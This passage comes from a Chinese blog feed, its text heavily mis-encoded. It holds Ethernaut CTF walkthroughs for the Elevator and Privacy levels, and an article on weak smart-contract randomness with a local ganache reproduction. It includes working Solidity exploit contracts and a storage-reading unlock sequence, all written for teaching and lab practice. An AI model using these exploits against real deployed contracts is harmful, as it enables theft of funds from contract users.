id="åˆçº¦åˆ†æ-10"><a href="#åˆçº¦åˆ†æ-10" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>é‡æ–°ç¼–å†™isLastFloorå‡½æ•°ï¼Œå¹¶è®¾ç½®flagåˆå§‹ä¸ºtrueã€‚åœ¨å®ä¾‹çš„goToå‡½æ•°ä¸­ï¼Œä¼šè°ƒç”¨ä¸¤æ¬¡isLastFloorå‡½æ•°ï¼Œå³ç¬¬ä¸€æ¬¡è®©flagå˜ä¸ºfalseï¼Œç¬¬äºŒæ¬¡è®©flagå˜ä¸ºtrue</p><h3 id="æ”»å‡»æµç¨‹-10"><a href="#æ”»å‡»æµç¨‹-10" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address instance_add = 0x98aD02A12F92eADb16dcF5285568CA7826B4b947;<br>    Elevator elevator = Elevator(instance_add);<br>    bool flag = true;<br><br>    function isLastFloor(uint) external returns (bool) &#123;<br>        flag = !flag;<br>        return flag;<br>    &#125;<br><br>    function attack() public &#123;<br>        elevator.goTo(5);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹topçŠ¶æ€å¹¶æäº¤å®ä¾‹</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224190112002.png" alt="image-20220224190112002"></p><h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12. Privacy"></a>12. Privacy</h2><h3 id="é—¯å…³è¦æ±‚-11"><a href="#é—¯å…³è¦æ±‚-11" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è¿™ä¸ªåˆçº¦çš„åˆ¶ä½œè€…éå¸¸å°å¿ƒçš„ä¿æŠ¤äº†æ•æ„ŸåŒºåŸŸçš„ storage.</p><p>è§£å¼€è¿™ä¸ªåˆçº¦æ¥å®Œæˆè¿™ä¸€å…³.</p><h3 id="åˆçº¦ä»£ç -11"><a href="#åˆçº¦ä»£ç -11" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Privacy &#123;<br><br>  bool public locked = true;<br>  uint256 public ID = block.timestamp;<br>  uint8 private flattening = 10;<br>  uint8 private denomination = 255;<br>  uint16 private awkwardness = uint16(now);<br>  bytes32[3] private data;<br><br>  constructor(bytes32[3] memory _data) public &#123;<br>    data = _data;<br>  &#125;<br>  <br>  function unlock(bytes16 _key) public &#123;<br>    require(_key == bytes16(data[2]));<br>    locked = false;<br>  &#125;<br><br>  /*<br>    A bunch of super advanced solidity algorithms...<br><br>      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`<br>      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,<br>      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\<br>      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)<br>      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU<br>  */<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-11"><a href="#åˆçº¦åˆ†æ-11" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>å‡çº§ç‰ˆvaultï¼Œç”¨ <code>getStorageAt()</code> æŠŠé“¾ä¸Šçš„æ•°æ®è¯»å‡ºæ¥</p><h3 id="æ”»å‡»æµç¨‹-11"><a href="#æ”»å‡»æµç¨‹-11" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><p>æ ¹æ®ä¼˜åŒ–å­˜å‚¨åŸåˆ™ï¼šå¦‚æœä¸‹ä¸€ä¸ªå˜é‡é•¿åº¦å’Œä¸Šä¸€ä¸ªå˜é‡é•¿åº¦åŠ èµ·æ¥ä¸è¶…è¿‡256bitsï¼ˆ32å­—èŠ‚ï¼‰ï¼Œå®ƒä»¬å°±ä¼šå­˜å‚¨åœ¨åŒä¸€ä¸ªæ’æ§½é‡Œ</p><p>é€šè¿‡æŸ¥è¯¢å¾—åˆ°</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224214603113.png" alt="image-20220224214603113"></p><p>å¯ä»¥åˆ†æ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">web3.eth.getStorageAt(contract.address,<span class="hljs-number">0</span>)<br><span class="hljs-comment">//0x0000000000000000000000000000000000000000000000000000000000000001  </span><br><span class="hljs-comment">//locked = true 1å­—èŠ‚ 01</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">1</span>)<br><span class="hljs-comment">//0x0000000000000000000000000000000000000000000000000000000062178997  </span><br><span class="hljs-comment">//ID = block.timestamp å¸¸é‡</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">2</span>)<br><span class="hljs-comment">//0x000000000000000000000000000000000000000000000000000000008997ff0a </span><br><span class="hljs-comment">// flattening = 10 1å­—èŠ‚ 0a</span><br><span class="hljs-comment">//denomination = 255 1å­—èŠ‚ ff</span><br><span class="hljs-comment">//awkwardness = uint16(now) 2å­—èŠ‚</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">3</span>)<br><span class="hljs-comment">//0xf29eea5d3875c68825a80d9c459dec52f5bbd55dd5ce827e00ec92ae60f7ddb2  </span><br><span class="hljs-comment">//data[0]</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">4</span>)<br><span class="hljs-comment">//0x153a7c6b4bf25f3a526a687713411c5ca83ae18c6f8950ff0f09be93bd36cb95  </span><br><span class="hljs-comment">//data[1]</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">5</span>)<br><span class="hljs-comment">//0x0b444a369c67e1d2436e5410d7c891644b6f088cb5f3451cc11f5ae67c451e18  </span><br><span class="hljs-comment">//data[2]</span><br><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è§£é”éœ€è¦çš„data[2]åº”è¯¥æ˜¯0x0b444a369c67e1d2436e5410d7c89164</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">contract.unlock(<span class="hljs-string">&#x27;0x0b444a369c67e1d2436e5410d7c89164&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥è§£é”æˆåŠŸ</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224220625238.png" alt="image-20220224220625238"></p><p>æäº¤å®ä¾‹</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224220653313-16459470826481.png" alt="image-20220224220653313"></p>]]></content>
    
    
    
    <tags>
      
      <tag>é¶åœºåˆ·é¢˜</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ™ºèƒ½åˆçº¦é”™è¯¯éšæœºæ€§</title>
    <link href="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/"/>
    <url>/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="é”™è¯¯éšæœºæ€§"><a href="#é”™è¯¯éšæœºæ€§" class="headerlink" title="é”™è¯¯éšæœºæ€§"></a>é”™è¯¯éšæœºæ€§</h1><p>æ™ºèƒ½åˆçº¦å¼€å‘ä¸­ï¼Œåœ¨ç¨‹åºä¸­ä½¿ç”¨éšæœºæ•°è¾ƒå¥½çš„ä¼ªéšæœºæ•°æ˜¯å¾ˆéš¾çš„ã€‚å¾ˆå¤šçœ‹ä¼¼æ— æ³•è¢«é¢„è¨€çš„éšæœºæ•°ç§å­æˆ–å˜é‡ï¼Œå®é™…è¢«é¢„è¨€çš„éš¾åº¦å¾ˆä½ã€‚</p><p>æ ¸å¿ƒé—®é¢˜ï¼šä¸€æ—¦åœ¨æ™ºèƒ½åˆçº¦ä¸­ä½¿ç”¨äº†éšæœºæ€§å¾ˆå·®çš„éšæœºæ•°ä½œä¸ºå…³é”®å˜é‡ï¼Œå°±é¢ä¸´ç€éšæœºæ•°è¢«é¢„è¨€çš„æ”»å‡»é£é™©ã€‚</p><h2 id="PRNGç›¸å…³æ¼æ´ç±»å‹"><a href="#PRNGç›¸å…³æ¼æ´ç±»å‹" class="headerlink" title="PRNGç›¸å…³æ¼æ´ç±»å‹"></a>PRNGç›¸å…³æ¼æ´ç±»å‹</h2><p>å¼€å‘è€…ç”Ÿæˆéšæœºæ•°æ—¶ï¼Œä¸€èˆ¬éƒ½ä¼šä½¿ç”¨ä¼ªéšæœºæ•°ç”Ÿæˆå™¨(pseudo-random number generator)ï¼Œç®€ç§° <code>PRNG</code>ã€‚è€Œæœ‰æ¼æ´çš„PRNGï¼Œä¸€èˆ¬æœ‰ä¸‰ç§ç±»å‹ï¼š</p><blockquote><ol><li><p>ä½¿ç”¨åŒºå—å˜é‡ä½œä¸ºç†µæºçš„ PRNG</p></li><li><p>åŸºäºè¿‡å¾€åŒºå—(å’Œç§æœ‰ç§å­)çš„åŒºå—å“ˆå¸Œçš„ PRNG</p></li><li><p>æ˜“è¢«æŠ¢å äº¤æ˜“(front-running)çš„ PRNG</p></li></ol></blockquote><h3 id="ä½¿ç”¨åŒºå—å˜é‡ä½œä¸ºç†µæº"><a href="#ä½¿ç”¨åŒºå—å˜é‡ä½œä¸ºç†µæº" class="headerlink" title="ä½¿ç”¨åŒºå—å˜é‡ä½œä¸ºç†µæº"></a>ä½¿ç”¨åŒºå—å˜é‡ä½œä¸ºç†µæº</h3><blockquote><p><code>block.coinbase</code> è¡¨ç¤ºå½“å‰åŒºå—çš„çŸ¿å·¥åœ°å€</p><p><code>block.difficulty</code> è¡¨ç¤ºå½“å‰åŒºå—çš„æŒ–æ˜éš¾åº¦</p><p><code>block.gaslimit</code> åŒºå—å†…äº¤æ˜“çš„æœ€å¤§é™åˆ¶ç‡ƒæ°”æ¶ˆè€—é‡</p><p><code>block.number</code> è¡¨ç¤ºå½“å‰åŒºå—é«˜åº¦</p><p><code>block.timestamp</code> è¡¨ç¤ºå½“å‰åŒºå—æŒ–æ˜æ—¶é—´</p></blockquote><p>ä»¥ä¸Šæ‰€æœ‰çš„åŒºå—å˜é‡éƒ½å¯ä»¥è¢«çŸ¿å·¥æ“çºµï¼Œæ‰€ä»¥éƒ½ä¸èƒ½ç”¨æ¥åšä¿¡æ¯ç†µæºã€‚å› ä¸ºè¿™äº›åŒºå—å˜é‡åœ¨åŒä¸€åŒºå—ä¸Šæ˜¯å…±ç”¨çš„ã€‚æ”»å‡»è€…é€šè¿‡å…¶æ¶æ„åˆçº¦è°ƒç”¨å—å®³è€…åˆçº¦ï¼Œé‚£ä¹ˆæ­¤äº¤æ˜“æ‰“åŒ…åœ¨åŒä¸€åŒºå—ä¸­ï¼Œå…¶åŒºå—å˜é‡æ˜¯ä¸€æ ·çš„ã€‚</p><h3 id="åŸºäºè¿‡å¾€åŒºå—çš„åŒºå—å“ˆå¸Œ"><a href="#åŸºäºè¿‡å¾€åŒºå—çš„åŒºå—å“ˆå¸Œ" class="headerlink" title="åŸºäºè¿‡å¾€åŒºå—çš„åŒºå—å“ˆå¸Œ"></a>åŸºäºè¿‡å¾€åŒºå—çš„åŒºå—å“ˆå¸Œ</h3><p>æ¯ä¸€ä¸ªEthereumåŒºå—é“¾ä¸Šçš„åŒºå—éƒ½æœ‰è®¤è¯çš„hashå€¼ï¼Œé€šè¿‡ <code>block.blockhash()</code> å‡½æ•°å¯ä»¥è·å–æ­¤å€¼ã€‚æ­¤å‡½æ•°ç»å¸¸è¢«é”™è¯¯åœ°ä½¿ç”¨ã€‚</p><blockquote><p><code>block.blockhash(block.number)</code> ï¼šåŸºäºå½“å‰åŒºå—çš„åŒºå—å“ˆå¸Œ</p><p><code>block.blockhash(block.number - 1)</code> ï¼š åŸºäºè´Ÿä¸€åŒºå—çš„åŒºå—å“ˆå¸Œ</p><p><code>Blockhash of a future block</code> : ä½¿ç”¨æœªæ¥åŒºå—çš„åŒºå—å“ˆå¸Œ</p><p><code>Blockhash with a private seed</code> : ä½¿ç”¨ä¸€ä¸ªç§æœ‰ç§å­(seed)å˜é‡</p></blockquote><h4 id="åŸºäºå½“å‰åŒºå—çš„åŒºå—å“ˆå¸Œ"><a href="#åŸºäºå½“å‰åŒºå—çš„åŒºå—å“ˆå¸Œ" class="headerlink" title="åŸºäºå½“å‰åŒºå—çš„åŒºå—å“ˆå¸Œ"></a>åŸºäºå½“å‰åŒºå—çš„åŒºå—å“ˆå¸Œ</h4><p>é€šè¿‡ <code>block.number</code> å˜é‡å¯ä»¥è·å–å½“å‰åŒºå—åŒºå—é«˜åº¦ã€‚ä½†æ˜¯è¿˜æ²¡æ‰§è¡Œæ—¶ï¼Œè¿™ä¸ªâ€œå½“å‰åŒºå—â€æ˜¯ä¸€ä¸ªæœªæ¥åŒºå—ï¼Œå³åªæœ‰å½“ä¸€ä¸ªçŸ¿å·¥æ‹¾å–ä¸€ä¸ªæ‰§è¡Œåˆçº¦ä»£ç çš„äº¤æ˜“æ—¶ï¼Œè¿™ä¸ªæœªæ¥åŒºå—æ‰å˜ä¸ºå½“å‰åŒºå—ï¼Œæ‰€ä»¥åˆçº¦æ‰å¯ä»¥å¯é åœ°è·å–æ­¤åŒºå—çš„åŒºå—å“ˆå¸Œã€‚è€Œä¸€äº›åˆçº¦æ›²è§£äº†<code>block.blockhash(block.number)</code> çš„å«ä¹‰ï¼Œè¯¯è®¤ä¸ºå½“å‰åŒºå—çš„åŒºå—å“ˆå¸Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­æ˜¯å·²çŸ¥çš„ï¼Œå¹¶å°†ä¹‹åšä¸ºç†µæºã€‚è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯åœ¨ä»¥å¤ªåŠè™šæ‹Ÿæœºä¸­(EVM)ï¼ŒåŒºå—å“ˆå¸Œæ’ä¸º 0ã€‚</p><h4 id="åŸºäºè´Ÿä¸€åŒºå—çš„åŒºå—å“ˆå¸Œ"><a href="#åŸºäºè´Ÿä¸€åŒºå—çš„åŒºå—å“ˆå¸Œ" class="headerlink" title="åŸºäºè´Ÿä¸€åŒºå—çš„åŒºå—å“ˆå¸Œ"></a>åŸºäºè´Ÿä¸€åŒºå—çš„åŒºå—å“ˆå¸Œ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 random = uint256(keccak256(block.blockhash(block.number - 1)));<br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„æ–¹å¼ï¼Œè™½ç„¶ç†è®ºä¸Šå¯ä»¥è·å¾—éšæœºæ•°ï¼Œä½†è¿™ä¸ªéšæœºæ•°æ˜¯ä¸å®‰å…¨çš„ã€‚å› ä¸ºæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ”¹é€ åçš„<code>FullNode</code>ï¼Œè®©è¿™ç¬”äº¤æ˜“å¯ä»¥åœ¨<code>FullNode</code>ä¸Šæ‰§è¡Œï¼Œå¹¶è·å¾—ç»“æœåï¼Œå†é€‰æ‹©æ€§å¹¿æ’­é‚£äº›å¯ä»¥ç¬¦åˆæ”»å‡»è€…æœŸæœ›çš„äº¤æ˜“ï¼Œå³å¯ä»¥æ“çºµäº¤æ˜“çš„æ‰§è¡Œç»“æœã€‚</p><p>æ”»å‡»åˆçº¦åªè¦ä»¥ç›¸åŒä»£ç æ‰§è¡Œï¼Œå³å¯ä»¥äº§ç”Ÿåˆ°åŒæ ·çš„ä¼ªéšæœºæ•°ã€‚</p><h4 id="ä½¿ç”¨æœªæ¥åŒºå—çš„åŒºå—å“ˆå¸Œ"><a href="#ä½¿ç”¨æœªæ¥åŒºå—çš„åŒºå—å“ˆå¸Œ" class="headerlink" title="ä½¿ç”¨æœªæ¥åŒºå—çš„åŒºå—å“ˆå¸Œ"></a>ä½¿ç”¨æœªæ¥åŒºå—çš„åŒºå—å“ˆå¸Œ</h4><p>ç¬¬ä¸€ç¬”äº¤æ˜“è§¦å‘åˆçº¦ï¼Œåˆçº¦å­˜å‚¨æŸä¸ªæœªæ¥åŒºå—é«˜åº¦ã€‚</p><p>ç¬¬äºŒç¬”äº¤æ˜“ï¼Œåˆçº¦æ£€ç´¢å½“å‰åŒºå—é«˜åº¦ï¼Œå¦‚æœè¶…è¿‡äº†å­˜å‚¨çš„æœªæ¥åŒºå—é«˜åº¦ï¼Œåˆ™é€šè¿‡åŒºå—å“ˆå¸Œè·å¾—ä¼ªéšæœºæ•°ç»“æœã€‚</p><p>ç„¶è€Œï¼Œè¿™ç§æ–¹å¼ä¹Ÿæœ‰å®ƒçš„å±€é™æ€§ï¼šåœ¨TVMä¸­ï¼Œ<code>blockhash</code>è¢«é™å®šä¸ºåªèƒ½è·å–è¿‘256ä¸ªé«˜åº¦åŒºå—çš„æ•°æ®ï¼Œå› æ­¤åœ¨ä»¥ä¸Šçš„ä¸¤ç¬”äº¤æ˜“é—´éš”è¶…è¿‡256 * 3sï¼Œå¤§çº¦12.8åˆ†é’Ÿåï¼Œè¿™ç§æ–¹å¼å°±ä¼šå¤±æ•ˆã€‚</p><p>æ­¤æ–¹æ³•åªæœ‰åœ¨ååˆ†å¿…è¦çš„æ—¶å€™æ‰èƒ½ä½¿ç”¨ã€‚å› ä¸ºä¹Ÿå­˜åœ¨ä¸€å®šå±é™©æ€§ï¼ŒEVM èƒ½å­˜å‚¨çš„åŒºå—å“ˆå¸Œä¸ºæœ€è¿‘çš„ 256 æ¡ã€‚è¶…è¿‡çš„è¯å€¼ä¸º 0ã€‚</p><h3 id="æ˜“è¢«æŠ¢å äº¤æ˜“-front-running"><a href="#æ˜“è¢«æŠ¢å äº¤æ˜“-front-running" class="headerlink" title="æ˜“è¢«æŠ¢å äº¤æ˜“(front-running)"></a>æ˜“è¢«æŠ¢å äº¤æ˜“(front-running)</h3><p>åŸç†ï¼šæ›´é«˜çš„ gas ä»·æ ¼ï¼Œäº¤æ˜“å°†æ›´å¿«è¢«çŸ¿å·¥æ‹¾å–æ‰“åŒ…ã€‚</p><p>ä¸ºäº†è·å–æœ€å¤§çš„å¥–åŠ±ï¼ŒçŸ¿å·¥é€šè¿‡æ¯ä¸ªäº¤æ˜“çš„ gas ç´¯ç§¯å€¼æ¥é€‰æ‹©å¹¶åˆ›å»ºæ–°çš„åŒºå—ã€‚è€Œè¿™äº›äº¤æ˜“çš„æ’åºæ˜¯åŸºäºå®ƒä»¬çš„ gas ä»·æ ¼ã€‚æœ€é«˜çš„ gas ä»·æ ¼ä¼šå…ˆè¢«æ‰§è¡Œã€‚ç”±æ­¤é€šè¿‡æ“çºµ gas ä»·æ ¼ï¼Œå¯ä»¥å°†äº¤æ˜“çš„é¡ºåºæ’åœ¨å½“å‰åŒºå—çš„å‰é¢ã€‚è¿™å°±ä¼šå¼•å‘æŠ¢å äº¤æ˜“é—®é¢˜ã€‚</p><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><h4 id="å‰æ"><a href="#å‰æ" class="headerlink" title="å‰æ"></a>å‰æ</h4><p>Ganache CLIä½¿ç”¨ethereumjsæ¥æ¨¡æ‹Ÿå®Œæ•´çš„å®¢æˆ·ç«¯è¡Œä¸ºï¼Œä½¿å¼€å‘ä»¥å¤ªåŠåº”ç”¨ç¨‹åºæ›´å¿«ï¼Œæ›´è½»æ¾ï¼Œæ›´å®‰å…¨ã€‚å®ƒè¿˜åŒ…æ‹¬æ‰€æœ‰ä¸»æµçš„RPCå‡½æ•°å’ŒåŠŸèƒ½ï¼ˆå¦‚eventï¼‰ï¼Œå¹¶å¯ä»¥å‡†ç¡®åœ°è¿è¡Œä»¥ä½¿å¼€å‘å˜å¾—å®¹æ˜“ã€‚</p><p>åœ¨åæ–‡çš„å¤ç°ä¸­ï¼Œç”±äºåœ¨remixä¸­ä½¿ç”¨VMä¼šæŠ¥é”™ï¼Œæ‰€ä»¥ä¼šä½¿ç”¨ganache-cliæ¥è¿›è¡Œæ¨¡æ‹Ÿã€‚</p><p>ganache-cliæ˜¯ç”¨Javascriptç¼–å†™çš„ï¼Œå¹¶é€šè¿‡npmä½œä¸ºNodeåŒ…è¿›è¡Œåˆ†å‘ã€‚å®‰è£…ä¹‹å‰é¦–å…ˆè¦ç¡®ä¿å®‰è£…äº†Node.jsï¼ˆ&gt; = v6.11.5ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨<code>node -v</code>æ¥æ£€æŸ¥è‡ªå·±çš„Node.jsçš„ç‰ˆæœ¬</p><p>å®‰è£…</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">npm install -g ganache-<span class="hljs-keyword">cli</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/image-20211109204427759.png" alt="image-20211109204427759"></p><p>å¯åŠ¨</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">ganache-<span class="hljs-keyword">cli</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/image-20211109204511611.png" alt="image-20211109204511611"></p><h4 id="æ¼æ´demo"><a href="#æ¼æ´demo" class="headerlink" title="æ¼æ´demo"></a>æ¼æ´demo</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.10;<br><br>contract GuessTheRandomNumber &#123;<br>    constructor() public payable &#123;<br>        <br>    &#125;<br>    <br>    //s<br>    function guess(uint guess) public &#123;<br>        uint answer = uint(keccak256(abi.encodePacked(<br>            blockhash(block.number - 1),<br>            block.timestamp<br>            )));<br>            <br>        if (guess == answer) &#123;<br>            (bool sent, ) = msg.sender.call&#123;value: 1 ether&#125;(&quot;&quot;);<br>            require(sent, &quot;Failed to send Ether&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ”»å‡»åˆçº¦"><a href="#æ”»å‡»åˆçº¦" class="headerlink" title="æ”»å‡»åˆçº¦"></a>æ”»å‡»åˆçº¦</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.10;<br><br>contract Attack &#123;<br>    fallback() external payable &#123;<br>        <br>    &#125;<br>    <br>    function attack(GuessTheRandomNumber guessTheRandomNumber) public &#123;<br>        uint answer = uint(keccak256(abi.encodePacked(<br>            blockhash(block.number - 1),<br>            block.timestamp<br>            )));<br>            <br>        guessTheRandomNumber.guess(answer);<br>    &#125;<br>    <br>    function getBalance() public view returns (uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h4><ul><li>åœ¨remixä¸­è¿è¡Œçš„æ—¶å€™é€‰æ‹©Web3 Providerï¼Œæ³¨æ„è¿™é‡Œçš„Web3 Provider Endpointåº”åŒ¹é…ä½¿ç”¨ganache-cliä¸­çš„ç«¯å£</li></ul><p><img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/image-20211109204630219.png" alt="image-20211109204630219"></p><ul><li>åˆ†åˆ«ä¸ºæ”»å‡»è€…å’Œå—å®³è€…åˆ›å»ºæ™ºèƒ½åˆçº¦</li></ul><p><img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/image-20211109213007345.png" alt="image-20211109213007345"></p><ul><li>è¾“å…¥å—å®³è€…åˆçº¦åœ°å€è¿›è¡Œæ”»å‡»åï¼Œå³å¯çœ‹åˆ°çŒœæµ‹æˆåŠŸï¼Œä½™é¢å¢åŠ </li></ul><p><img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/image-20211109213117127.png" alt="image-20211109213117127"></p><h2 id="è¾ƒå®‰å…¨ä¼ªéšæœºæ•°çš„äº§ç”Ÿæ–¹æ³•"><a href="#è¾ƒå®‰å…¨ä¼ªéšæœºæ•°çš„äº§ç”Ÿæ–¹æ³•" class="headerlink" title="è¾ƒå®‰å…¨ä¼ªéšæœºæ•°çš„äº§ç”Ÿæ–¹æ³•"></a>è¾ƒå®‰å…¨ä¼ªéšæœºæ•°çš„äº§ç”Ÿæ–¹æ³•</h2><h3 id="hash-commit-reveal"><a href="#hash-commit-reveal" class="headerlink" 